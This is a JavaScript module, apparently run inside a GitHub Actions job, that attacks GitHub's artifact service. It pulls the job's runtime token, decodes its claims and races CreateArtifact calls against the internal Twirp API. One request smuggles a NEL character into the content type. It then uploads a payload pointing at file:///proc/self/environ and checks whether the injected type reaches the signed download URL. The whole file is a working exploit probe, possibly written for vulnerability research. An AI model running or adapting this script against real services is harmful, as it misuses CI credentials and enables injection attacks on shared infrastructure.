module.exports = async function scan({context}) {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const endpoint = process.env.ACTIONS_RESULTS_URL;
  if (!token || !endpoint) throw new Error('Actions runtime unavailable');
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'));
  const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
  const base = new URL('/twirp/github.actions.results.api.v1.ArtifactService/', endpoint).href;
  const payload = Buffer.from('{"full_name":"probe/x","owner":{"avatar_url":"file:///proc/self/environ"}}');
  const auth = {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'};

  async function twirp(method, body) {
    const response = await fetch(base + method, {
      method: 'POST', headers: auth, body: JSON.stringify(body),
    });
    const data = await response.json().catch(() => ({}));
    return {status: response.status, data};
  }

  for (let i = 0; i < 12; i++) {
    const name = `nel-race-${context.runId}-${i}`;
    const six = () => twirp('CreateArtifact', {...ids, name, version: 6, mime_type: 'application/json\u0085'});
    const seven = () => twirp('CreateArtifact', {...ids, name, version: 7, mime_type: 'application/json'});
    const [a, b] = i % 2 === 0 ? await Promise.all([six(), seven()]) : await Promise.all([seven(), six()]);
    const ordered = i % 2 === 0 ? [{version: 6, response: a}, {version: 7, response: b}] : [{version: 7, response: a}, {version: 6, response: b}];
    const usable = ordered.filter(item => item.response.status === 200 && item.response.data.ok && (item.response.data.signed_upload_url || item.response.data.signedUploadUrl));
    if (!usable.length) {
      console.log(JSON.stringify({pair: i, created: ordered.map(item => [item.version, item.response.status]), outcome: 'no-upload-url'}));
      continue;
    }
    const uploadUrl = usable[0].response.data.signed_upload_url || usable[0].response.data.signedUploadUrl;
    const put = await fetch(uploadUrl, {method: 'PUT', headers: {
      'Content-Type': 'application/octet-stream', 'x-ms-version': '2025-01-05',
      'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': 'application/json\u0085',
    }, body: payload});
    if (!put.ok) {
      console.log(JSON.stringify({pair: i, created: ordered.map(item => [item.version, item.response.status]), put: put.status}));
      continue;
    }
    const finalized = await twirp('FinalizeArtifact', {...ids, name, size: String(payload.length)});
    const id = String(finalized.data.artifact_id || finalized.data.artifactId || '');
    let restStatus = null, rsct = null, rawType = null, rawMatches = null;
    if (/^\d+$/.test(id)) {
      const rest = await fetch(`https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/artifacts/${id}/zip`, {
        redirect: 'manual', headers: {'Authorization': `Bearer ${process.env.GH_TOKEN}`, 'Accept': 'application/vnd.github.v3+json'},
      });
      restStatus = rest.status;
      const location = rest.headers.get('location');
      if (location) {
        rsct = new URL(location).searchParams.get('rsct');
        if (rsct?.includes('\u0085')) {
          const raw = await fetch(location);
          rawType = raw.headers.get('content-type');
          rawMatches = Buffer.from(await raw.arrayBuffer()).equals(payload);
        }
      }
    }
    console.log(JSON.stringify({pair: i, created: ordered.map(item => [item.version, item.response.status]), finalized: finalized.status, id, restStatus, rsct, rawType, rawMatches}));
  }
};
